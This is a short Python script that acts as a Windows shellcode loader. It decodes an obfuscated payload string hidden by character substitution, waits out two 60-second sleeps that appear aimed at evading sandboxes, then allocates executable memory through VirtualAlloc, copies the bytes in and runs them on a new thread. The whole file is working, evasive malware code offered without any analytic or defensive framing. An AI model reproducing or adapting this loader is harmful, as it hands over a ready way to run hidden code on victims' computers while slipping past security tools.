#!/usr/bin/python

import ctypes
import time

def decoder(data):
	"""Decode jesus to an executable Shell"""
	jesus0 = data.replace("h","x")
	jesus1 = jesus0.replace("i","0")
	jesus2 = jesus1.replace("j","1")
	jesus3 = jesus2.replace("k","2")
	jesus4 = jesus3.replace("l","3")
	jesus5 = jesus4.replace("m","4")
	jesus6 = jesus5.replace("o","5")
	jesus7 = jesus6.replace("p","6")
	jesus8 = jesus7.replace("q","7")
	jesus9 = jesus8.replace("s","8")
	jesusa = jesus9.replace("u","9")
	jesusb = jesusa.replace("w","a")
	jesusc = jesusb.replace("y","b")
	jesusd = jesusc.replace("z","c")
	jesuse = jesusd.replace("_","d")
	jesusf = jesuse.replace("+","e")
	jesuse = jesusf.replace("=","f")
	jesus = jesuse.replace("g","\\")
	return jesus


time.sleep(60)

salvation = "ghysghmoghmwghwighlygh__ghzpgh_ughqmghkmgh=mghoyghkughzughyjghomghslgh+ygh=zghljghmlghi=ghilghmlghmwghwsghooghzqghyzghw+ghupghlsghlzghz=ghj=gh__ghi_ghz=ghmmghuoghl_gh==ghi=gh=yghyjghqmgho_gh+sghmkgh=sghmwghj=gh+lghyqghwzghk+gh=mgh+mghs_ghljghqpgh=qghzjghujghmqghlsghjmgh_lghsighkogh_oghsjghoughkjghmsghlpgh++ghq=ghojghy_ghyzghp+gh_jghkkghqmghuigh=igh=mghi=ghzygh_kgh=qgh_zghpqghoygh+ighijghm_ghjoghuygh=jghlughwmghm_ghzsghzkghiyghyigh+oghlighoogh=mghzjghwwghkighizghlkghopghllghzyghmughszghypghzsgh+ughmqghpighloghisghsygh=qghy+ghipghpighqlghusghiwghqqghoighukghlpgh=zghoqghqoghy=ghmpghqzghojgh+mghj_ghj_ghzighmigh=lghkkghjkghkyghwzghspghosghzjghyughywghikghs_ghi+gh=qghyzghm_ghjughsighz=ghq=ghspghlwghosghllghm=gh+oghu=ghlmghqwghojghi=ghzyghsoghwkghjughi=gh_jgh=kghljghwpghowghuughzjghmqghs=ghlmghzqgh_=ghlwgh=+gh_yghjsgholghikgh+mghkqghjsghsyghikghqqghi+gh_zghuwghlqgh=+ghuzghmwgh_=ghjmghjlghymgh==ghjpgh=ugh__ghuogh=sghomghyoghijghpigh=_ghm_ghyighp_ghkyghksgh=kgh+pgh_+ghzzghyzghi+ghwwgh_+ghwsghp+ghomghj=ghksghjyghomghqoghkzghs_ghilgh+jghk+gh+sghpmghw+gh_jgh_=gh=pghwughk_ghu+ghz+ghzkghjyghlmghp=ghy_ghplgh_sghp=ghl_ghloghykghp=ghoogh+jgh+pghklghmigh++ghlkghoigh_ughqwghy_ghijghs_ghk_gh_oghw=gh+sghjughqwghm=gh_=ghjwghq_ghw=ghu_ghl+ghkpgh_sgho_ghq+gh_pghjsghlmghq+ghspghqighzlghojghkughyjghkzghqsghpkgh_ughwqgh+zghzighqsghyqghkoghsmghkmghysghzughj_ghlighlqghk+ghwkghl_ghyughjlghqmghimghz=ghomghmmghllghzigh+=gh+ughjkghmyghi=ghy_ghpogho+"

diablo = decoder(salvation)

time.sleep(60)

jesus = bytearray(diablo.replace('\\x', '').decode('hex'))

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(jesus)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
 
buf = (ctypes.c_char * len(jesus)).from_buffer(jesus)
 
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(jesus)))
 
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))
 
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))